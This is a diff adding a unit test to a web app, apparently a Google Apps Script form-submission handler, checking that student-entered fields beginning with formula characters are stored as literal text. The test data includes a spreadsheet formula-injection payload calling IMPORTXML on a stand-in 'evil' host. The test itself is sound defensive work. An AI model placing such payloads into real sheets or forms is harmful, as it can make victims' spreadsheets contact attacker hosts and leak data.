@@ -281,3 +281,11 @@ test('appsscript.json manifest is valid and configured for the web app', () => {
   assert.equal(m.webapp.access, 'ANYONE_ANONYMOUS');
   assert.equal(m.webapp.executeAs, 'USER_DEPLOYING');
 });
+
+test('student-supplied text starting with a formula character is stored as literal text', () => {
+  post(sample({ student_name: '=IMPORTXML("http://evil","//a")', student_email: '+x@y.org', test_title: '@title' }));
+  const row = sheets.get('Submissions').rows[1];
+  assert.equal(row[2], `'=IMPORTXML("http://evil","//a")`);
+  assert.equal(row[3], "'+x@y.org");
+  assert.equal(row[5], "'@title");
+});
